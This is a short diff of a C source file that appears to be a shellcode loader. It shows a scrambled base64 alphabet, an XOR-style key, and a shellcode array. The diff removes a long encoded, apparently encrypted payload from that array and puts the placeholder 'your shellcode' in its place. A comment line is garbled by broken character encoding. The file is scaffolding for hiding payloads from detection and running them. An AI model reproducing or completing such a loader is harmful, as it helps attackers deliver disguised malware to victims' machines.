@@ -5,7 +5,7 @@
 #include <time.h>
 
 static char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
-static unsigned char shellcode[] = "dmIgeyhW/vJ7VaP8YIOnLv4FxrRC30T8mb07MGOzDv5vlg9/KnShMug7D7kmZiZ6No1An9th9r8ABCRs2dNjsE21tHCKti2xAIlq34Co1Cie39irfgl9JNMDthT7V97/BSOGAits6IHUVOa/w9z+wC9Gtvgqf0iE+imiMDdqjXmLZiZ6Nn3iSmpDKS767nhvMETzprPGCMJhQWO7Duwnk998gIaN4HJzD8pMZEZTw4PP0aPBYIChLo4HZr2iK8gTYuP8UUGXAIncHvOE3aTi0jNA9TURHuTeseomAskAa9PgJgWddzRTQ1H5KnVUwV8A96tG3mjJtxiTurzR93DrYB/cwVizWe1FGhe2/K732Ni7kN7fO7UU5OaYPFeRMbQ8VvFxSrkwimHR6sSe1EUMQa9++HN/NFI6GQZF30NI582Bk5Iyta+SeajcSJpkozvQfKoHLb/a/eMCHLyEK8OJ6U1Hh/jj4Gj65NlBk5sy0HM23q8+4yqRy2cT4EAKThVxhq0vur7DkFXglocrlrXTS621ahTBOfsgCk4c/as/tsr7Rakw89ELGsSeSEBtDurJK49J3BIEzVC7jFPtYuWE5oCP58xHwozD3Iam3AorkxUvku61rek4hosVqH9SU+yYDVZM3rjEwgBywkmn26JHfywU9EgfM0IByljikVNyAAAA";
+static unsigned char shellcode[] = "your shellcode";
 static char key[] = "AeB&79!ra0(3*)";
 
 // Base64���뺯��
